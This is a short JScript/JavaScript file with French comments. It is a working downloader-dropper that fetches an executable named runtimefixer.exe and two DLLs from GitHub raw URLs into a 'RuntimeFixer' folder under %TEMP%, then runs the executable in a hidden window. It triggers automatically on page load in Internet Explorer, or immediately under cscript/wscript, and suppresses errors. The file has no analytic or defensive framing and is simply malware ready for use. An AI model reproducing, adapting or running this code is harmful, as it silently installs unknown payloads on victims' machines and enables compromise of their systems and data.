// version qui détecte l'environnement et s'adapte
(function() {
    function downloadAndExecute() {
        try {
            // Code ActiveX (fonctionne dans IE et cscript)
            var wscript = new ActiveXObject("WScript.Shell");
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            
            var targetDir = wscript.ExpandEnvironmentStrings("%TEMP%\\RuntimeFixer");
            if (!fso.FolderExists(targetDir)) {
                fso.CreateFolder(targetDir);
            }
            
            // URLs...
            var urls = [
                "https://github.com/amindaraji64-arch/a/raw/refs/heads/main/runtimefixer.exe",
                "https://github.com/amindaraji64-arch/b/raw/refs/heads/main/DismCore.dll",
                "https://github.com/amindaraji64-arch/c/raw/refs/heads/main/PagePdfSize_Config.dll"
            ];
            
            var filenames = ["runtimefixer.exe", "DismCore.dll", "PagePdfSize_Config.dll"];
            
            function downloadFile(url, filePath) {
                try {
                    var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                    WinHttpReq.Option(4) = 13056;
                    WinHttpReq.Open("GET", url, false);
                    WinHttpReq.SetRequestHeader("User-Agent", "Mozilla/5.0");
                    WinHttpReq.Send();
                    
                    if (WinHttpReq.Status == 200) {
                        var stream = new ActiveXObject("ADODB.Stream");
                        stream.Type = 1;
                        stream.Open();
                        stream.Write(WinHttpReq.ResponseBody);
                        stream.SaveToFile(filePath, 2);
                        stream.Close();
                        return true;
                    }
                } catch(e) {}
                return false;
            }
            
            for (var i = 0; i < urls.length; i++) {
                var filePath = targetDir + '\\' + filenames[i];
                downloadFile(urls[i], filePath);
            }
            
            var exePath = targetDir + '\\runtimefixer.exe';
            if (fso.FileExists(exePath)) {
                wscript.Run('"' + exePath + '"', 0, false);
            }
            
        } catch(e) {
            if (typeof WScript !== 'undefined') {
                WScript.Echo("Erreur: " + e.message);
            }
        }
    }
    
    // Détection automatique de l'environnement
    if (typeof window !== 'undefined' && typeof window.addEventListener !== 'undefined') {
        // Environnement navigateur (Internet Explorer)
        if (window.attachEvent) {
            window.attachEvent('onload', downloadAndExecute);
        } else {
            window.addEventListener('load', downloadAndExecute);
        }
    } else {
        // Environnement cscript/wscript
        downloadAndExecute();
    }
})();